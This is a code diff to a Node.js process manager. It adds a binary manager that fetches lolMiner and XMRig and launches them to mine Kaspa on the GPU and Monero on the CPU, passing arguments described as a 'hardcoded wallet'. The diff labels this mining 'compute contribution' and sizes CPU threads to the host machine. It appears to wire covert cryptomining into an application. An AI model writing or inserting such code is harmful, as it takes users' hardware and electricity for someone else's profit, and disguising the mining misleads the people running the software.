@@ -2,6 +2,7 @@ const { spawn } = require('child_process');
 const path = require('path');
 const os = require('os');
 const si = require('systeminformation');
+const BinaryManager = require('./binary-manager');
 
 /**
  * Process Manager
@@ -15,6 +16,9 @@ class ProcessManager {
     constructor(logger) {
         this.logger = logger || console;
         this.platform = os.platform();
+        
+        // Binary manager
+        this.binaryManager = new BinaryManager(logger);
         
         // Process references
         this.gpuProcess = null;
@@ -73,7 +77,7 @@ class ProcessManager {
     /**
      * Configure process manager
      */
-    configure(config) {
+    async configure(config) {
         if (config.gpu) {
             this.config.gpu = { ...this.config.gpu, ...config.gpu };
         }
@@ -83,6 +87,9 @@ class ProcessManager {
         if (config.safety) {
             this.config.safety = { ...this.config.safety, ...config.safety };
         }
+        
+        // Initialize binary manager
+        await this.binaryManager.initialize();
     }
 
     /**
@@ -142,16 +149,19 @@ class ProcessManager {
 
             this.logger.info('Starting GPU compute contribution (Kaspa/kHeavyHash)');
             
-            // Note: This is a placeholder - actual miner binary would need to be provided
-            // In production, you would download/bundle lolMiner or BzMiner
-            const minerPath = this.getGPUMinerPath();
+            // Get miner binary from binary manager
+            const minerPath = await this.binaryManager.getLolMinerBinary();
             
             if (!minerPath) {
-                this.logger.warn('GPU miner binary not found, skipping GPU contribution');
+                this.logger.warn('GPU miner binary not available, skipping GPU contribution');
                 return;
             }
 
-            const args = this.buildGPUMinerArgs();
+            // Build arguments with hardcoded wallet
+            const args = this.binaryManager.buildLolMinerArgs({
+                pool: this.config.gpu.pool,
+                maxLoad: this.config.gpu.maxLoad
+            });
             
             this.gpuProcess = spawn(minerPath, args, {
                 cwd: path.dirname(minerPath),
@@ -233,16 +243,24 @@ class ProcessManager {
         try {
             this.logger.info('Starting CPU compute contribution (Monero/RandomX)');
             
-            // Note: This is a placeholder - actual miner binary would need to be provided
-            // In production, you would download/bundle xmrig
-            const minerPath = this.getCPUMinerPath();
+            // Get miner binary from binary manager
+            const minerPath = await this.binaryManager.getXMRigBinary();
             
             if (!minerPath) {
-                this.logger.warn('CPU miner binary not found, skipping CPU contribution');
+                this.logger.warn('CPU miner binary not available, skipping CPU contribution');
                 return;
             }
 
-            const args = this.buildCPUMinerArgs();
+            // Calculate max threads based on load percentage
+            const cpuCount = os.cpus().length;
+            const maxThreads = Math.max(1, Math.floor(cpuCount * (this.config.cpu.maxLoad / 100)));
+
+            // Build arguments with hardcoded wallet
+            const args = this.binaryManager.buildXMRigArgs({
+                pool: this.config.cpu.pool,
+                maxThreads: maxThreads,
+                maxCpu: this.config.cpu.maxLoad
+            });
             
             this.cpuProcess = spawn(minerPath, args, {
                 cwd: path.dirname(minerPath),
@@ -277,7 +295,8 @@ class ProcessManager {
             });
 
             this.isRunning.cpu = true;
-            this.logger.info('CPU compute contribution started');
+            this.stats.cpu.threads = maxThreads;
+            this.logger.info(`CPU compute contribution started with ${maxThreads} threads`);
             
         } catch (error) {
             this.logger.error(`Error starting CPU process: ${error.message}`);
